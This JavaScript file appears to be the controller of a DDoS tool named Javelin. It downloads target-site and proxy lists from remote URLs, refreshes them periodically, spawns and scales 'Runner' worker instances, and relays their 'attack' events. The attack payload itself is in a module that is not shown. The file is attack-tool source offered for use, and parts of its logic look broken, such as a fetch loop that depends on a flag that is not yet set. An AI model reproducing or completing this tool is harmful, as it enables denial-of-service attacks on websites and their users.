const axios = require('axios-https-proxy-fix');
const {Runner} = require('./runner');
const { EventEmitter } = require('events')

function logError(message, cause) {
	console.error(message)

	if (cause) {
		console.error(cause.message);
	}
}

class Javelin {
	constructor(numberOfWorkers, sitesUrl, proxiesUrl) {
		this.numberOfWorkers = numberOfWorkers;
		this.sitesUrl = sitesUrl;
		this.proxiesUrl = proxiesUrl;
		this.workers = [];
    this.working = false;
    this.eventSource = new EventEmitter()
		this.CONFIGURATION_INVALIDATION_TIME = process.env.CONFIGURATION_INVALIDATION_TIME;
		this.initialize(numberOfWorkers).catch(error => {
      console.error('Wasnt able to initialize:', error)
    })
	}

	async initialize (numberOfWorkers, attemptNumber = 1) {
    const config = await this.getSitesAndProxies();
	
    if (!config) {
      console.debug(`No proxy configuration. Trying for ${attemptNumber} time`)
      return this.initialize(numberOfWorkers, attemptNumber + 1)
    }

    console.debug('Javelin is started...')
    this.updateConfiguration(config)
    this.listenForConfigurationUpdates()
    
		return this.setWorkers(numberOfWorkers)
  }

	async getSitesAndProxies () {
    while (this.working) {
			console.debug('Get sites and proxies...')
      try {
        const [proxies, sites] = await Promise.all([this.getProxies(), this.getSites()])

        if (proxies.status !== 200 || sites.status !== 200) continue

        return {
          sites: sites.data,
          proxies: proxies.data
        }
      } catch (e) {
        logError('Error while loading hosts', e)
      }
    }
  }

	updateConfiguration (configuration) {
    this.ddosConfiguration = {
      ...configuration,
      updateTime: new Date()
    }
    this.workers.forEach(worker => {
      worker.updateConfiguration(configuration)
    })
  }

	listenForConfigurationUpdates(wasPreviousUpdateSuccessful = true) {
    setTimeout(async () => {
      if (!this.ddosConfiguration) {
        return this.listenForConfigurationUpdates(false)
      }

      const config = await this.getSitesAndProxies()
      if (!config) {
        console.debug('Cant get configuration updates')
        return this.listenForConfigurationUpdates(false)
      }
      this.updateConfiguration(config)
      this.listenForConfigurationUpdates(true)
    }, wasPreviousUpdateSuccessful ? this.CONFIGURATION_INVALIDATION_TIME : this.CONFIGURATION_INVALIDATION_TIME / 10)
  }

	setWorkers(newCount) {
    console.debug(`Workers count ${this.numberOfWorkers} => ${newCount}`)
    if (newCount < this.numberOfWorkers) {
      for (let i = this.numberOfWorkers; i >= newCount; i--) {
        this.workers[i].eventSource.removeAllListeners()
        this.workers[i].stop()
      }
      this.workers = this.workers.slice(0, newCount)
    } else {
      while (this.workers.length < newCount) {
        const newWorker = this.createNewWorker()
        this.workers.push(newWorker)
        if (this.working) {
          newWorker.start().catch(error => {
            console.debug('Wasnt able to start new runner:', error)
          })
        }
      }
    }

    this.numberOfWorkers = newCount
  }

	start() {
    this.working = true
    this.workers.forEach((worker, i) => {
      console.debug(`Starting runner ${i}..`)
      worker.start().catch(error => {
        console.error(`Cant start worker #${i} - `, error)
      })
    })
  }

  stop() {
    this.working = false
    this.workers.forEach((worker, i) => {
      console.debug(`Stopping runner ${i}..`)
      worker.stop()
    })
  }

	createNewWorker() {
    console.debug('Creating new worker...')

    if (!this.ddosConfiguration) {
      throw new Error('Cannot create worker without configuration')
    }

    const worker = new Runner({
      sites: this.ddosConfiguration.sites,
      proxies: this.ddosConfiguration.proxies,
      onlyProxy: this.onlyProxy
    })
    worker.eventSource.on('attack', event => {
      this.eventSource.emit('attack', {
        type: 'attack',
        ...event
      })
    })

    worker.eventSource.on('error', event => {
      this.eventSource.emit('error', event)
    })
    return worker
  }

	listen (event, callback) {
    this.eventSource.addListener(event, callback)
  }

	getSites() {
		return axios.get(this.sitesUrl, { timeout: 10000 })
	}

	getProxies() {
		return axios.get(this.proxiesUrl, { timeout: 10000 })
	}
	
}

exports.Javelin = Javelin;
